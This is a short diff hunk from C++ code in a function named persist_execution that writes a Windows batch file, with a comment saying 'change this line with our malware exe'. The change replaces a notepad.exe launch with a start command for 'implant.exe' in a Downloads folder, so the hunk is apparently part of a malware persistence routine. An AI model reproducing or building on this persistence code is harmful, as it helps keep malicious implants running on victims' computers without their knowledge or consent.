@@ -23,7 +23,7 @@ void persist_execution(void){
    batfile << "@echo off\n";
 
    //change this line with our malware exe
-   batfile << "@start \"c:\\Windows\\System32\\notepad.exe\\\"\n";
+   batfile << "@start \"c:\\users\\Downloads\\implant.exe\\\"\n";
    batfile << "@pause\n";
    
    // Close the file since finished with writing
